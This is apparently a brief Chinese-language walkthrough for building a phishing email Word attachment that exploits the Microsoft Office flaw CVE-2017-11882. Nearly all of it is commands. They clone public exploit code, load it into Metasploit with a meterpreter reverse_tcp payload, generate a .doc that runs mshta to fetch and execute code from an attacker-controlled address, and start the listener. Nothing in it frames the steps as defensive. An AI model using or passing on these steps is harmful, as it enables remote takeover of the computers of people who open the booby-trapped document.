### 利用CVE-2017-11882漏洞制作钓鱼邮件word附件

```sh
# 准备
git clone https://github.com/Ridter/CVE-2017-11882.git
git clone https://github.com/0x09AL/CVE-2017-11882-metasploit.git

cp cve_2017_11882.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
cp cve-2017-11882.rtf /usr/share/metasploit-framework/data/exploits/

# 实施
1. msfconsole
2. use exploit/windows/smb/cve_2017_11882
3. set payload windows/meterpreter/reverse_tcp
4. set LHOST 192.168.72.3
5. set URIPATH test
6. show options

# 生成文档
python ./CVE-2017-11882/Command109b_CVE-2017-11882.py -c ""mshta http://192.168.72.3:8080/test" -o kail_help.doc

# 在msfconsole里执行
use exploit/windows/smb/cve_2017_11882
exploit -j
```
